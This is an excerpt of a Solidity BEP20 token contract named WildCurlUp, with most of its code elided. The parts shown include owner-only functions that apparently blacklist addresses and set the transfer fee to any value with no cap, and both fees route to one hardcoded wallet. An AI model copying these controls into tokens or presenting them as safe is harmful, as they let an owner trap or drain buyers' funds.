...
contract Willup is IBEP20, Auth {
    ...
    string constant _name = "WildCurlUp";
    string constant _symbol = "Willup";
    ...
    address private marketingFeeReceiver = 0x862e5816319f715a2EfECd6fd48C91cD15193483;
    address private buybackFeeReceiver = 0x862e5816319f715a2EfECd6fd48C91cD15193483;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Willup seems to happen Insufficient Allowance!!!!");
        }
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Willup seems to happen Insufficient Balance!!!!");
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (recipient != UniswapV2Pair && recipient != DEAD && sender != owner && recipient != owner) {
            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletSize, "Willup Transfer seems to happen amount exceeds the bag size!!!!");
        }
    ...
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "Willup TX Limit Exceeded");
    }
    ...
    function swapBack() internal swapping {
        ...
        require(MarketingSuccess, "Willup receiver rejected ETH transfer");
        (bool BuyBackSuccess, /* bytes memory data */) = payable(buybackFeeReceiver).call{value : amountBNBbuyback, gas : 30000}("");
        require(BuyBackSuccess, "Willup receiver rejected ETH transfer");
    ...
    function setDLWillup(address addr, bool bv) external onlyOwner {
        isBBB[addr] = bv;
    }

    function setDEWillup(uint256 fe) external onlyOwner {
        totalFee = fe;
    }
    ...
    function transferForeignTokenWillup(address _token) public authorized {
        require(_token != address(this), "Willup Can't let you take all native token");
    ...
    function isOverLiquifiedWillup(uint256 target, uint256 accuracy) public view returns (bool) {
